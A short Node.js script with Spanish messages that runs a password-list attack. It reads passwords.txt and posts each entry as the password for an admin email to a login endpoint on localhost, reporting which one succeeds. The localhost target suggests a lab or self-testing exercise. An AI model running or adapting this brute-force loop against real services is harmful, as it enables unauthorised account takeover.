const axios = require('axios');

const fs = require('fs');

let url = "http://localhost:3000/auth";

const archivo = 'passwords.txt';

fs.readFile(archivo, 'utf8', async (err, data) => {
    if (err) {
        console.error('Error al leer el archivo:', err);
        return;
    }

    const lineas = data.split('\n').map(linea => linea.trim());
    const datos = lineas.filter(linea => linea !== '');

    for (let i = 0; i < datos.length; i++) {
        try {
            const response = await axios.post(url, { email: "admin@gmail.com", pass: datos[i] });
            const respuesta = response.data;

            if (respuesta === "LOGIN CORRECTO") {
                console.log(`The password ${datos[i]} is valid. Response: ` + respuesta);
            } else if (respuesta === "USUARIO O PASSWORD INCORRECTAS") {
                console.log(`THE PASSWORD ${datos[i]} IS NOT VALID. RESPONSE: ` + respuesta);
            } else {
                console.log(respuesta);
            }
            console.log(" ");
        } catch (error) {
            console.error('Error al enviar la solicitud:', error.message);
        }
    }
});




